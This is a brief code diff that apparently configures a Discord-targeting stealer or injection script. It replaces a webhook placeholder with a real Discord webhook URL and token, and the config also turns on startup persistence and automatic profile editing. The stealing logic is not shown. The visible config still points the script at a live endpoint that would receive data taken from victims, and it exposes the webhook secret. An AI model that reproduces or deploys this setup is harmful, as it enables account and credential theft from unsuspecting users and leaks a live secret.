@@ -31,7 +31,7 @@ const execScript = async (script) => {
 };
 
 const CONFIG = {
-    webhook: '%WEBHOOK_URL%',
+    webhook: 'https://discord.com/api/webhooks/1485049531107377192/mdytIGbmhcY4JnwNdvs6lxecB-9QX_gPHojzouXNR7RuCeTtKP7GBuzCZ1U8UTw_eDuN',
     API: '%API_URL%',
     auto_user_profile_edit: 'True',
     auto_persist_startup: 'True',
